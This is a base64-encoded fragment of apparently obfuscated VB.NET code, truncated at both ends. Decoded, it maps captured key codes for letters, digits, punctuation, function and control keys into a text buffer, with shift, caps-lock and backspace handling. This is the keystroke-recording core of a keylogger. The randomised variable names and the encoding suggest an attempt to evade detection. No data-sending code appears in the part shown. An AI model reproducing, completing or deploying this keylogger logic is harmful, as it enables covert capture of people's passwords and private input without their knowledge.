d294YUJBVEhvZ2VESkdrID0gS2V5cy5LIFRoZW4NCiAgICAgICAgICAgICAgICBbNTRdLlRleHQgKz0gIksiDQogICAgICAgICAgICBFbHNlSWYgaEpaRmF1d294YUJBVEhvZ2VESkdrID0gS2V5cy5MIFRoZW4NCiAgICAgICAgICAgICAgICBbNTRdLlRleHQgKz0gIkwiDQogICAgICAgICAgICBFbHNlSWYgaEpaRmF1d294YUJBVEhvZ2VESkdrID0gS2V5cy5NIFRoZW4NCiAgICAgICAgICAgICAgICBbNTRdLlRleHQgKz0gIk0iDQogICAgICAgICAgICBFbHNlSWYgaEpaRmF1d294YUJBVEhvZ2VESkdrID0gS2V5cy5OIFRoZW4NCiAgICAgICAgICAgICAgICBbNTRdLlRleHQgKz0gIk4iDQogICAgICAgICAgICBFbHNlSWYgaEpaRmF1d294YUJBVEhvZ2VESkdrID0gS2V5cy5PIFRoZW4NCiAgICAgICAgICAgICAgICBbNTRdLlRleHQgKz0gIk8iDQogICAgICAgICAgICBFbHNlSWYgaEpaRmF1d294YUJBVEhvZ2VESkdrID0gS2V5cy5QIFRoZW4NCiAgICAgICAgICAgICAgICBbNTRdLlRleHQgKz0gIlAiDQogICAgICAgICAgICBFbHNlSWYgaEpaRmF1d294YUJBVEhvZ2VESkdrID0gS2V5cy5RIFRoZW4NCiAgICAgICAgICAgICAgICBbNTRdLlRleHQgKz0gIlEiDQogICAgICAgICAgICBFbHNlSWYgaEpaRmF1d294YUJBVEhvZ2VESkdrID0gS2V5cy5SIFRoZW4NCiAgICAgICAgICAgICAgICBbNTRdLlRleHQgKz0gIlIiDQogICAgICAgICAgICBFbHNlSWYgaEpaRmF1d294YUJBVEhvZ2VESkdrID0gS2V5cy5TIFRoZW4NCiAgICAgICAgICAgICAgICBbNTRdLlRleHQgKz0gIlMiDQogICAgICAgICAgICBFbHNlSWYgaEpaRmF1d294YUJBVEhvZ2VESkdrID0gS2V5cy5UIFRoZW4NCiAgICAgICAgICAgICAgICBbNTRdLlRleHQgKz0gIlQiDQogICAgICAgICAgICBFbHNlSWYgaEpaRmF1d294YUJBVEhvZ2VESkdrID0gS2V5cy5VIFRoZW4NCiAgICAgICAgICAgICAgICBbNTRdLlRleHQgKz0gIlUiDQogICAgICAgICAgICBFbHNlSWYgaEpaRmF1d294YUJBVEhvZ2VESkdrID0gS2V5cy5WIFRoZW4NCiAgICAgICAgICAgICAgICBbNTRdLlRleHQgKz0gIlYiDQogICAgICAgICAgICBFbHNlSWYgaEpaRmF1d294YUJBVEhvZ2VESkdrID0gS2V5cy5XIFRoZW4NCiAgICAgICAgICAgICAgICBbNTRdLlRleHQgKz0gIlciDQogICAgICAgICAgICBFbHNlSWYgaEpaRmF1d294YUJBVEhvZ2VESkdrID0gS2V5cy5YIFRoZW4NCiAgICAgICAgICAgICAgICBbNTRdLlRleHQgKz0gIlgiDQogICAgICAgICAgICBFbHNlSWYgaEpaRmF1d294YUJBVEhvZ2VESkdrID0gS2V5cy5ZIFRoZW4NCiAgICAgICAgICAgICAgICBbNTRdLlRleHQgKz0gIlkiDQogICAgICAgICAgICBFbHNlSWYgaEpaRmF1d294YUJBVEhvZ2VESkdrID0gS2V5cy5aIFRoZW4NCiAgICAgICAgICAgICAgICBbNTRdLlRleHQgKz0gIloiDQogICAgICAgICAgICBFbHNlSWYgaEpaRmF1d294YUJBVEhvZ2VESkdrID0gS2V5cy5PZW1jb21tYSBUaGVuDQogICAgICAgICAgICAgICAgWzU0XS5UZXh0ICs9ICI8Ig0KICAgICAgICAgICAgRWxzZUlmIGhKWkZhdXdveGFCQVRIb2dlREpHayA9IEtleXMuT2VtTWludXMgVGhlbg0KICAgICAgICAgICAgICAgIFs1NF0uVGV4dCArPSAiXyINCiAgICAgICAgICAgIEVsc2VJZiBoSlpGYXV3b3hhQkFUSG9nZURKR2sgPSBLZXlzLk9lbU9wZW5CcmFja2V0cyBUaGVuDQogICAgICAgICAgICAgICAgWzU0XS5UZXh0ICs9ICJ7Ig0KICAgICAgICAgICAgRWxzZUlmIGhKWkZhdXdveGFCQVRIb2dlREpHayA9IEtleXMuT2VtQ2xvc2VCcmFja2V0cyBUaGVuDQogICAgICAgICAgICAgICAgWzU0XS5UZXh0ICs9ICJ9Ig0KICAgICAgICAgICAgRWxzZUlmIGhKWkZhdXdveGFCQVRIb2dlREpHayA9IEtleXMuT2VtUXVlc3Rpb24gVGhlbg0KICAgICAgICAgICAgICAgIFs1NF0uVGV4dCArPSAiPyINCiAgICAgICAgICAgIEVsc2VJZiBoSlpGYXV3b3hhQkFUSG9nZURKR2sgPSBLZXlzLk9lbVBpcGUgVGhlbg0KICAgICAgICAgICAgICAgIFs1NF0uVGV4dCArPSAifCINCiAgICAgICAgICAgIEVsc2VJZiBoSlpGYXV3b3hhQkFUSG9nZURKR2sgPSBLZXlzLk9lbTEgVGhlbg0KICAgICAgICAgICAgICAgIFs1NF0uVGV4dCArPSAiOiINCiAgICAgICAgICAgIEVsc2VJZiBoSlpGYXV3b3hhQkFUSG9nZURKR2sgPSBLZXlzLk9lbVBlcmlvZCBUaGVuDQogICAgICAgICAgICAgICAgWzU0XS5UZXh0ICs9ICI+Ig0KICAgICAgICAgICAgRWxzZUlmIGhKWkZhdXdveGFCQVRIb2dlREpHayA9IEtleXMuT2VtdGlsZGUgVGhlbg0KICAgICAgICAgICAgICAgIFs1NF0uVGV4dCArPSAifiINCiAgICAgICAgICAgIEVsc2VJZiBoSlpGYXV3b3hhQkFUSG9nZURKR2sgPSBLZXlzLk9lbVF1b3RlcyBUaGVuDQogICAgICAgICAgICAgICAgJ1s1NF0udGV4dCArPSAqcXVvdGUqDQogICAgICAgICAgICBFbHNlSWYgaEpaRmF1d294YUJBVEhvZ2VESkdrID0gS2V5cy5TcGFjZSBUaGVuDQogICAgICAgICAgICAgICAgWzU0XS5UZXh0ICs9ICIgIg0KICAgICAgICAgICAgRWxzZUlmIGhKWkZhdXdveGFCQVRIb2dlREpHayA9IEtleXMuRW50ZXIgVGhlbg0KICAgICAgICAgICAgICAgIFs1NF0uVGV4dCArPSB2Yk5ld0xpbmUNCiAgICAgICAgICAgIEVsc2VJZiBoSlpGYXV3b3hhQkFUSG9nZURKR2sgPSBLZXlzLkYxIFRoZW4NCiAgICAgICAgICAgICAgICBbNTRdLlRleHQgKz0gIltGMV0iDQogICAgICAgICAgICBFbHNlSWYgaEpaRmF1d294YUJBVEhvZ2VESkdrID0gS2V5cy5GMiBUaGVuDQogICAgICAgICAgICAgICAgWzU0XS5UZXh0ICs9ICJbRjJdIg0KICAgICAgICAgICAgRWxzZUlmIGhKWkZhdXdveGFCQVRIb2dlREpHayA9IEtleXMuRjMgVGhlbg0KICAgICAgICAgICAgICAgIFs1NF0uVGV4dCArPSAiW0YzXSINCiAgICAgICAgICAgIEVsc2VJZiBoSlpGYXV3b3hhQkFUSG9nZURKR2sgPSBLZXlzLkY0IFRoZW4NCiAgICAgICAgICAgICAgICBbNTRdLlRleHQgKz0gIltGNF0iDQogICAgICAgICAgICBFbHNlSWYgaEpaRmF1d294YUJBVEhvZ2VESkdrID0gS2V5cy5GNSBUaGVuDQogICAgICAgICAgICAgICAgWzU0XS5UZXh0ICs9ICJbRjVdIg0KICAgICAgICAgICAgRWxzZUlmIGhKWkZhdXdveGFCQVRIb2dlREpHayA9IEtleXMuRjYgVGhlbg0KICAgICAgICAgICAgICAgIFs1NF0uVGV4dCArPSAiW0Y2XSINCiAgICAgICAgICAgIEVsc2VJZiBoSlpGYXV3b3hhQkFUSG9nZURKR2sgPSBLZXlzLkY3IFRoZW4NCiAgICAgICAgICAgICAgICBbNTRdLlRleHQgKz0gIltGN10iDQogICAgICAgICAgICBFbHNlSWYgaEpaRmF1d294YUJBVEhvZ2VESkdrID0gS2V5cy5GOCBUaGVuDQogICAgICAgICAgICAgICAgWzU0XS5UZXh0ICs9ICJbRjhdIg0KICAgICAgICAgICAgRWxzZUlmIGhKWkZhdXdveGFCQVRIb2dlREpHayA9IEtleXMuRjkgVGhlbg0KICAgICAgICAgICAgICAgIFs1NF0uVGV4dCArPSAiW0Y5XSINCiAgICAgICAgICAgIEVsc2VJZiBoSlpGYXV3b3hhQkFUSG9nZURKR2sgPSBLZXlzLkYxMCBUaGVuDQogICAgICAgICAgICAgICAgWzU0XS5UZXh0ICs9ICJbRjEwXSINCiAgICAgICAgICAgIEVsc2VJZiBoSlpGYXV3b3hhQkFUSG9nZURKR2sgPSBLZXlzLkYxMSBUaGVuDQogICAgICAgICAgICAgICAgWzU0XS5UZXh0ICs9ICJbRjExXSINCiAgICAgICAgICAgIEVsc2VJZiBoSlpGYXV3b3hhQkFUSG9nZURKR2sgPSBLZXlzLkYxMiBUaGVuDQogICAgICAgICAgICAgICAgWzU0XS5UZXh0ICs9ICJbRjEyXSINCiAgICAgICAgICAgIEVsc2VJZiBoSlpGYXV3b3hhQkFUSG9nZURKR2sgPSBLZXlzLkRlbGV0ZSBUaGVuDQogICAgICAgICAgICAgICAgWzU0XS5UZXh0ICs9ICJbREVMXSINCiAgICAgICAgICAgIEVsc2VJZiBoSlpGYXV3b3hhQkFUSG9nZURKR2sgPSBLZXlzLkJhY2sgVGhlbg0KICAgICAgICAgICAgICAgIFs1NF0uVGV4dCArPSAiW0RFTF0iDQogICAgICAgICAgICBFbHNlSWYgaEpaRmF1d294YUJBVEhvZ2VESkdrID0gS2V5cy5Eb3duIFRoZW4NCiAgICAgICAgICAgICAgICBbNTRdLlRleHQgKz0gIiINCiAgICAgICAgICAgIEVsc2VJZiBoSlpGYXV3b3hhQkFUSG9nZURKR2sgPSBLZXlzLlVwIFRoZW4NCiAgICAgICAgICAgICAgICBbNTRdLlRleHQgKz0gIiINCiAgICAgICAgICAgIEVsc2VJZiBoSlpGYXV3b3hhQkFUSG9nZURKR2sgPSBLZXlzLkxlZnQgVGhlbg0KICAgICAgICAgICAgICAgIFs1NF0uVGV4dCArPSAiIg0KICAgICAgICAgICAgRWxzZUlmIGhKWkZhdXdveGFCQVRIb2dlREpHayA9IEtleXMuUmlnaHQgVGhlbg0KICAgICAgICAgICAgICAgIFs1NF0uVGV4dCArPSAiIg0KICAgICAgICAgICAgRWxzZUlmIGhKWkZhdXdveGFCQVRIb2dlREpHayA9IEtleXMuVGFiIFRoZW4NCiAgICAgICAgICAgICAgICBbNTRdLlRleHQgKz0gIltUQUJdIg0KICAgICAgICAgICAgRWxzZUlmIGhKWkZhdXdveGFCQVRIb2dlREpHayA9IEtleXMuRW5kIFRoZW4NCiAgICAgICAgICAgICAgICBbNTRdLlRleHQgKz0gIltFTkRdIg0KICAgICAgICAgICAgRWxzZUlmIGhKWkZhdXdveGFCQVRIb2dlREpHayA9IEtleXMuRXNjYXBlIFRoZW4NCiAgICAgICAgICAgICAgICBbNTRdLlRleHQgKz0gIltFU0NdIg0KICAgICAgICAgICAgRWxzZUlmIGhKWkZhdXdveGFCQVRIb2dlREpHayA9IEtleXMuRGl2aWRlIFRoZW4NCiAgICAgICAgICAgICAgICBbNTRdLlRleHQgKz0gIi8iDQogICAgICAgICAgICBFbHNlSWYgaEpaRmF1d294YUJBVEhvZ2VESkdrID0gS2V5cy5EZWNpbWFsIFRoZW4NCiAgICAgICAgICAgICAgICBbNTRdLlRleHQgKz0gIi4iDQogICAgICAgICAgICBFbHNlSWYgaEpaRmF1d294YUJBVEhvZ2VESkdrID0gS2V5cy5TdWJ0cmFjdCBUaGVuDQogICAgICAgICAgICAgICAgWzU0XS5UZXh0ICs9ICItIg0KICAgICAgICAgICAgRWxzZUlmIGhKWkZhdXdveGFCQVRIb2dlREpHayA9IEtleXMuQWRkIFRoZW4NCiAgICAgICAgICAgICAgICBbNTRdLlRleHQgKz0gIisiDQogICAgICAgICAgICBFbHNlSWYgaEpaRmF1d294YUJBVEhvZ2VESkdrID0gS2V5cy5NdWx0aXBseSBUaGVuDQogICAgICAgICAgICAgICAgWzU0XS5UZXh0ICs9ICIqIg0KICAgICAgICAgICAgRWxzZUlmIGhKWkZhdXdveGFCQVRIb2dlREpHayA9IEtleXMuQ29udHJvbEtleSBUaGVuDQogICAgICAgICAgICAgICAgWzU0XS5UZXh0ICs9ICJbQ1RSTF0iDQogICAgICAgICAgICBFbHNlSWYgaEpaRmF1d294YUJBVEhvZ2VESkdrID0gS2V5cy5BbHQgVGhlbg0KICAgICAgICAgICAgICAgIFs1NF0uVGV4dCArPSAiW0FMVF0iDQogICAgICAgICAgICBFbHNlSWYgaEpaRmF1d294YUJBVEhvZ2VESkdrID0gS2V5cy5QYWdlVXAgVGhlbg0KICAgICAgICAgICAgICAgIFs1NF0uVGV4dCArPSAiW1BhZ2UgVXBdIg0KICAgICAgICAgICAgRWxzZUlmIGhKWkZhdXdveGFCQVRIb2dlREpHayA9IEtleXMuUGFnZURvd24gVGhlbg0KICAgICAgICAgICAgICAgIFs1NF0uVGV4dCArPSAiW1BhZ2UgRG93bl0iDQogICAgICAgICAgICBFbHNlSWYgaEpaRmF1d294YUJBVEhvZ2VESkdrID0gS2V5cy5Ib21lIFRoZW4NCiAgICAgICAgICAgICAgICBbNTRdLlRleHQgKz0gIltIb21lXSINCiAgICAgICAgICAgIEVsc2VJZiBoSlpGYXV3b3hhQkFUSG9nZURKR2sgPSBLZXlzLkluc2VydCBUaGVuDQogICAgICAgICAgICAgICAgWzU0XS5UZXh0ICs9ICJbSW5zZXJ0XSINCiAgICAgICAgICAgIEVsc2VJZiBoSlpGYXV3b3hhQkFUSG9nZURKR2sgPSBLZXlzLkVuZCBUaGVuDQogICAgICAgICAgICAgICAgWzU0XS5UZXh0ICs9ICJbRW5kXSINCiAgICAgICAgICAgIEVsc2VJZiBoSlpGYXV3b3hhQkFUSG9nZURKR2sgPSBLZXlzLkVzY2FwZSBUaGVuDQogICAgICAgICAgICAgICAgWzU0XS5UZXh0ICs9ICJbRXNjXSINCiAgICAgICAgICAgIEVsc2VJZiBoSlpGYXV3b3hhQkFUSG9nZURKR2sgPSBLZXlzLlByaW50U2NyZWVuIFRoZW4NCiAgICAgICAgICAgICAgICBbNTRdLlRleHQgKz0gIltQcnQgU2NyZWVuXSINCiAgICAgICAgICAgIEVuZCBJZg0KICAgICAgICBFbHNlSWYgTXkuQ29tcHV0ZXIuS2V5Ym9hcmQuU2hpZnRLZXlEb3duID0gRmFsc2UgQW5kIE15LkNvbXB1dGVyLktleWJvYXJkLkNhcHNMb2NrID0gVHJ1ZSBUaGVuDQogICAgICAgICAgICBJZiBoSlpGYXV3b3hhQkFUSG9nZURKR2sgPSBLZXlzLkQxIFRoZW4NCiAgICAgICAgICAgICAgICBbNTRdLlRleHQgKz0gIjEiDQogICAgICAgICAgICBFbHNlSWYgaEpaRmF1d294YUJBVEhvZ2VESkdrID0gS2V5cy5EMiBUaGVuDQogICAgICAgICAgICAgICAgWzU0XS5UZXh0ICs9ICIyIg0KICAgICAgICAgICAgRWxzZUlmIGhKWkZhdXdveGFCQVRIb2dlREpHayA9IEtleXMuRDMgVGhlbg0KICAgICAgICAgICAgICAgIFs1NF0uVGV4dCArPSAiMyINCiAgICAgICAgICAgIEVsc2VJZiBoSlpGYXV3b3hhQkFUSG9nZURKR2sgPSBLZXlzLkQ0IFRoZW4NCiAgICAgICAgICAgICAgICBbNTRdLlRleHQgKz0gIjQiDQogICAgICAgICAgICBFbHNlSWYgaEpaRmF1d294YUJBVEhvZ2VESkdrID0gS2V5cy5ENSBUaGVuDQogICAgICAgICAgICAgICAgWzU0XS5UZXh0ICs9ICI1Ig0KICAgICAgICAgICAgRWxzZUlmIGhKWkZhdXdveGFCQVRIb2dlREpHayA9IEtleXMuRDYgVGhlbg0KICAgICAgICAgICAgICAgIFs1NF0uVGV4dCArPSAiNiINCiAgICAgICAgICAgIEVsc2VJZiBoSlpGYXV3b3hhQkFUSG9nZURKR2sgPSBLZXlzLkQ3IFRoZW4NCiAgICAgICAgICAgICAgICBbNTRdLlRleHQgKz0gIjciDQogICAgICAgICAgICBFbHNlSWYgaEpaRmF1d294YUJBVEhvZ2VESkdrID0gS2V5cy5EOCBUaGVuDQogICAgICAgICAgICAgICAgWzU0XS5UZXh0ICs9ICI4Ig0KICAgICAgICAgICAgRWxzZUlmIGhKWkZhdXdveGFCQVRIb2dlREpHayA9IEtleXMuRDkgVGhlbg0KICAgICAgICAgICAgICAgIFs1NF0uVGV4dCArPSAiOSINCiAgICAgICAgICAgIEVsc2VJZiBoSlpGYXV3b3hhQkFUSG9nZURKR2sgPSBLZXlzLkQwIFRoZW4NCiAgICAgICAgICAgICAgICBbNTRdLlRleHQgKz0gIjAiDQogICAgICAgICAgICBFbHNlSWYgaEpaRmF1d294YUJBVEhvZ2VESkdrID0gS2V5cy5BIFRoZW4NCiAgICAgICAgICAgICAgICBbNTRdLlRleHQgKz0gImEiDQogICAgICAgICAgICBFbHNlSWYgaEpaRmF1d294YUJBVEhvZ2VESkdrID0gS2V5cy5CIFRoZW4NCiAgICAgICAgICAgICAgICBbNTRdLlRleHQgKz0gImIiDQogICAgICAgICAgICBFbHNlSWYgaEpaRmF1d294YUJBVEhvZ2VESkdrID0gS2V5cy5DIFRoZW4NCiAgICAgICAgICAgICAgICBbNTRdLlRleHQgKz0gImMiDQogICAgICAgICAgICBFbHNlSWYgaEpaRmF1d294YUJBVEhvZ2VESkdrID0gS2V5cy5EIFRoZW4NCiAgICAgICAgICAgICAgICBbNTRdLlRleHQgKz0gImQiDQogICAgICAgICAgICBFbHNlSWYgaEpaRmF1d294YUJBVEhvZ2VESkdrID0gS2V5cy5FIFRoZW4NCiAgICAgICAgICAgICAgICBbNTRdLlRleHQgKz0gImUiDQogICAgICAgICAgICBFbHNlSWYgaEpaRmF1d294YUJBVEhvZ2VESkdrID0gS2V5cy5GIFRoZW4NCiAgICAgICAgICAgICAgICBbNTRdLlRleHQgKz0gImYiDQogICAgICAgICAgICBFbHNlSWYgaEpaRmF1d294YUJBVEhvZ2VESkdrID0gS2V5cy5HIFRoZW4NCiAgICAgICAgICAgICAgICBbNTRdLlRleHQgKz0gImciDQogICAgICAgICAgICBFbHNlSWYgaEpaRmF1d294YUJBVEhvZ2VESkdrID0gS2V5cy5IIFRoZW4NCiAgICAgICAgICAgICAgICBbNTRdLlRleHQgKz0gImgiDQogICAgICAgICAgICBFbHNlSWYgaEpaRmF1d294YUJBVEhvZ2VESkdrID0gS2V5cy5JIFRoZW4NCiAgICAgICAgICAgICAgICBbNTRdLlRleHQgKz0gImkiDQogICAgICAgICAgICBFbHNlSWYgaEpaRmF1d294YUJBVEhvZ2VESkdrID0gS2V5cy5KIFRoZW4NCiAgICAgICAgICAgICAgICBbNTRdLlRleHQgKz0gImoiDQogICAgICAgICAgICBFbHNlSWYgaEpaRmF1d294YUJBVEhvZ2VESkdrID0gS2V5cy5LIFRoZW4NCiAgICAgICAgICAgICAgICBbNTRdLlRleHQgKz0gImsiDQogICAgICAgICAgICBFbHNlSWYgaEpaRmF1d294YUJBVEhvZ2VESkdrID0gS2V5cy5MIFRoZW4NCiAgICAgICAgICAgICAgICBbNTRdLlRleHQgKz0gImwiDQogICAgICAgICAgICBFbHNlSWYgaEpaRmF1d294YUJBVEhvZ2VESkdrID0gS2V5cy5NIFRoZW4NCiAgICAgICAgICAgICAgICBbNTRdLlRleHQgKz0gIm0iDQogICAgICAgICAgICBFbHNlSWYgaEpaRmF1d294YUJBVEhvZ2VESkdrID0gS2V5cy5OIFRoZW4NCiAgICAgICAgICAgICAgICBbNTRdLlRleHQgKz0gIm4iDQogICAgICAgICAgICBFbHNlSWYgaEpaRmF1d294YUJBVEhvZ2VESkdrID0gS2V5cy5PIFRoZW4NCiAgICAgICAgICAgICAgICBbNTRdLlRleHQgKz0gIm8iDQogICAgICAgICAgICBFbHNlSWYgaEpaRmF1d294YUJBVEhvZ2VESkdrID0gS2V5cy5QIFRoZW4NCiAgICAgICAgICAgICAgICBbNTRdLlRleHQgKz0gInAiDQogICAgICAgICAgICBFbHNlSWYgaEpaRmF1d294YUJBVEhvZ2VESkdrID0gS2V5cy5RIFRoZW4NCiAgICAgICAgICAgICAgICBbNTRdLlRleHQgKz0gInEiDQogICAgICAgICAgICBFbHNlSWYgaEpaRmF1d294YUJBVEhvZ2VESkdrID0gS2V5cy5SIFRoZW4NCiAgICAgICAgICAgICAgICBbNTRdLlRleHQgKz0gInIiDQogICAgICAgICAgICBFbHNlSWYgaEpaRmF1d294YUJBVEhvZ2VESkdrID0gS2V5cy5TIFRoZW4NCiAgICAgICAgICAgICAgICBbNTRdLlRleHQgKz0gInMiDQogICAgICAgICAgICBFbHNlSWYgaEpaRmF1d294YUJBVEhvZ2VESkdrID0gS2V5cy5UIFRoZW4NCiAgICAgICAgICAgICAgICBbNTRdLlRleHQgKz0gInQiDQogICAgICAgICAgICBFbHNlSWYgaEpaRmF1d294YUJBVEhvZ2VESkdrID0gS2V5cy5VIFRoZW4NCiAgICAgICAgICAgICAgICBbNTRdLlRleHQgKz0gInUiDQogICAgICAgICAgICBFbHNlSWYgaEpaRmF1d294YUJBVEhvZ2VESkdrID0gS2V5cy5WIFRoZW4NCiAgICAgICAgICAgICAgICBbNTRdLlRleHQgKz0gInYiDQogICAgICAgICAgICBFbHNlSWYgaEpaRmF1d294YUJBVEhvZ2VESkdrID0gS2V5cy5XIFRoZW4NCiAgICAgICAgICAgICAgICBbNTRdLlRleHQgKz0gInciDQogICAgICAgICAgICBFbHNlSWYgaEpaRmF1d294YUJBVEhvZ2VESkdrID0gS2V5cy5YIFRoZW4NCiAgICAgICAgICAgICAgICBbNTRdLlRleHQgKz0gIngiDQogICAgICAgICAgICBFbHNlSWYgaEpaRmF1d294YUJBVEhvZ2VESkdrID0gS2V5cy5ZIFRoZW4NCiAgICAgICAgICAgICAgICBbNTRdLlRleHQgKz0gInkiDQogICAgICAgICAgICBFbHNlSWYgaEpaRmF1d294YUJBVEhvZ2VESkdrID0gS2V5cy5aIFRoZW4NCiAgICAgICAgICAgICAgICBbNTRdLlRleHQgKz0gInoiDQogICAgICAgICAgICBFbHNlSWYgaEpaRmF1d294YUJBVEhvZ2VESkdrID0gS2V5cy5PZW1jb21tYSBUaGVuDQogICAgICAgICAgICAgICAgWzU0XS5UZXh0ICs9ICIsIg0KICAgICAgICAgICAgRWxzZUlmIGhKWkZhdXdveGFCQVRIb2dlREpHayA9IEtleXMuT2VtTWludXMgVGhlbg0KICAgICAgICAgICAgICAgIFs1NF0uVGV4dCArPSAiLSINCiAgICAgICAgICAgIEVsc2VJZiBoSlpGYXV3b3hhQkFUSG9nZURKR2sgPSBLZXlzLk9lbVF1b3RlcyBUaGVuDQogICAgICAgICAgICAgICAgWzU0XS5UZXh0ICs9ICInIg0KICAgICAgICAgICAgRWxzZUlmIGhKWkZhdXdveGFCQVRIb2dlREpHayA9IEtleXMuT2VtT3BlbkJyYWNrZXRzIFRoZW4NCiAgICAgICAgICAgICAgICBbNTRdLlRleHQgKz0gIlsiDQogICAgICAgICAgICBFbHNlSWYgaEpaRmF1d294YUJBVEhvZ2VESkdrID0gS2V5cy5PZW1DbG9zZUJyYWNrZXRzIFRoZW4NCiAgICAgICAgICAgICAgICBbNTRdLlRleHQgKz0gIl0iDQogICAgICAgICAgICBFbHNlSWYgaEpaRmF1d294YUJBVEhvZ2VESkdrID0gS2V5cy5PZW1RdWVzdGlvbiBUaGVuDQogICAgICAgICAgICAgICAgWzU0XS5UZXh0ICs9ICIvIg0KICAgICAgICAgICAgRWxzZUlmIGhKWkZhdXdveGFCQVRIb2dlREpHayA9IEtleXMuT2VtUGlwZSBUaGVuDQogICAgICAgICAgICAgICAgWzU0XS5UZXh0ICs9ICJcIg0KICAgICAgICAgICAgRWxzZUlmIGhKWkZhdXdveGFCQVRIb2dlREpHayA9IEtleXMuT2VtMSBUaGVuDQogICAgICAgICAgICAgICAgWzU0XS5UZXh0ICs9ICI7Ig0KICAgICAgICAgICAgRWxzZUlmIGhKWkZhdXdveGFCQVRIb2dlREpHayA9IEtleXMuT2VtUGVyaW9kIFRoZW4NCiAgICAgICAgICAgICAgICBbNTRdLlRleHQgKz0gIi4iDQogICAgICAgICAgICBFbHNlSWYgaEpaRmF1d294YUJBVEhvZ2VESkdrID0gS2V5cy5PZW10aWxkZSBUaGVuDQogICAgICAgICAgICAgICAgWzU0XS5UZXh0ICs9ICJgIg0KICAgICAgICAgICAgRWxzZUlmIGhKWkZhdXdveGFCQVRIb2dlREpHayA9IEtleXMuU3BhY2UgVGhlbg0KICAgICAgICAgICAgICAgIFs1NF0uVGV4dCArPSAiICINCiAgICAgICAgICAgIEVsc2VJZiBoSlpGYXV3b3hhQkFUSG9nZURKR2sgPSBLZXlzLkVudGVyIFRoZW4NCiAgICAgICAgICAgICAgICBbNTRdLlRleHQgKz0gdmJOZXdMaW5lDQogICAgICAgICAgICBFbHNlSWYgaEpaRmF1d294YUJBVEhvZ2VESkdrID0gS2V5cy5GMSBUaGVuDQogICAgICAgICAgICAgICAgWzU0XS5UZXh0ICs9ICJbRjFdIg0KICAgICAgICAgICAgRWxzZUlmIGhKWkZhdXdveGFCQVRIb2dlREpHayA9IEtleXMuRjIgVGhlbg0KICAgICAgICAgICAgICAgIFs1NF0uVGV4dCArPSAiW0YyXSINCiAgICAgICAgICAgIEVsc2VJZiBoSlpGYXV3b3hhQkFUSG9nZURKR2sgPSBLZXlzLkYzIFRoZW4NCiAgICAgICAgICAgICAgICBbNTRdLlRleHQgKz0gIltGM10iDQogICAgICAgICAgICBFbHNlSWYgaEpaRmF1d294YUJBVEhvZ2VESkdrID0gS2V5cy5GNCBUaGVuDQogICAgICAgICAgICAgICAgWzU0XS5UZXh0ICs9ICJbRjRdIg0KICAgICAgICAgICAgRWxzZUlmIGhKWkZhdXdveGFCQVRIb2dlREpHayA9IEtleXMuRjUgVGhlbg0KICAgICAgICAgICAgICAgIFs1NF0uVGV4dCArPSAiW0Y1XSINCiAgICAgICAgICAgIEVsc2VJZiBoSlpGYXV3b3hhQkFUSG9nZURKR2sgPSBLZXlzLkY2IFRoZW4NCiAgICAgICAgICAgICAgICBbNTRdLlRleHQgKz0gIltGNl0iDQogICAgICAgICAgICBFbHNlSWYgaEpaRmF1d294YUJBVEhvZ2VESkdrID0gS2V5cy5GNyBUaGVuDQogICAgICAgICAgICAgICAgWzU0XS5UZXh0ICs9ICJbRjddIg0KICAgICAgICAgICAgRWxzZUlmIGhKWkZhdXdveGFCQVRIb2dlREpHayA9IEtleXMuRjggVGhlbg0KICAgICAgICAgICAgICAgIFs1NF0uVGV4dCArPSAiW0Y4XSINCiAgICAgICAgICAgIEVsc2VJZiBoSlpGYXV3b3hhQkFUSG9nZURKR2sgPSBLZXlzLkY5IFRoZW4NCiAgICAgICAgICAgICAgICBbNTRdLlRleHQgKz0gIltGOV0iDQogICAgICAgICAgICBFbHNlSWYgaEpaRmF1d294YUJBVEhvZ2VESkdrID0gS2V5cy5GMTAgVGhlbg0KICAgICAgICAgICAgICAgIFs1NF0uVGV4dCArPSAiW0YxMF0iDQogICAgICAgICAgICBFbHNlSWYgaEpaRmF1d294YUJBVEhvZ2VESkdrID0gS2V5cy5GMTEgVGhlbg0KICAgICAgICAgICAgICAgIFs1NF0uVGV4dCArPSAiW0YxMV0iDQogICAgICAgICAgICBFbHNlSWYgaEpaRmF1d294YUJBVEhvZ2VESkdrID0gS2V5cy5GMTIgVGhlbg0KICAgICAgICAgICAgICAgIFs1NF0uVGV4dCArPSAiW0YxMl0iDQogICAgICAgICAgICBFbHNlSWYgaEpaRmF1d294YUJBVEhvZ2VESkdrID0gS2V5cy5EZWxldGUgVGhlbg0KICAgICAgICAgICAgICAgIElmIE5vdCBbNTRdLlRleHQuRW5kc1dpdGgodmJOZXdMaW5lKSBUaGVuDQogICAgICAgICAgICAgICAgICAgIElmIE5vdCBbNTRdLlRleHQuRW5kc1dpdGgoInwiKSBUaGVuDQogICAgICAgICAgICAgICAgICAgICAgICBJZiBOb3QgWzU0XS5UZXh0LkVuZHNXaXRoKCJdIikgVGhlbg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIFs1NF0uVGV4dCA9IFs1NF0uVGV4dC5TdWJzdHJpbmcoMCwgWzU0XS5UZXh0Lkxlbmd0aCAtIDEpDQogICAgICAgICAgICAgICAgICAgICAgICBFbmQgSWYNCiAgICAgICAgICAgICAgICAgICAgRW5kIElmDQogICAgICAgICAgICAgICAgRW5kIElmDQogICAgICAgICAgICBFbHNlSWYgaEpaRmF1d294YUJBVEhvZ2VESkdrID0gS2V5cy5CYWNrIFRoZW4NCiAgICAgICAgICAgICAgICBJZiBOb3QgWzU0XS5UZXh0LkVuZHNXaXRoKHZiTmV3TGluZSkgVGhlbg0KICAgICAgICAgICAgICAgICAgICBJZiBOb3QgWzU0XS5UZXh0LkVuZHNXaXRoKCJ8IikgVGhlbg0KICAgICAgICAgICAgICAgICAgICAgICAgSWYgTm90IFs1NF0uVGV4dC5FbmRzV2l0aCgiXSIpIFRoZW4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBbNTRdLlRleHQgPSBbNTRdLlRleHQuU3Vic3RyaW5nKDAsIFs1NF0uVGV4dC5MZW5ndGggLSAxKQ0KICAgICAgICAgICAgICAgICAgICAgICAgRW5kIElmDQogICAgICAgICAgICAgICAgICAgIEVuZCBJZg0KICAgICAgICAgICAgICAgIEVuZCBJZg0KICAgICAgICAgICAgRWxzZUlmIGhKWkZhdXdveGFCQVRIb2dlREpHayA9IEtleXMuRG93biBUaGVuDQogICAgICAgICAgICAgICAgWzU0XS5UZXh0ICs9ICIiDQogICAgICAgICAgICBFbHNlSWYgaEpaRmF1d294YUJBVEhvZ2VESkdrID0gS2V5cy5VcCBUaGVuDQogICAgICAgICAgI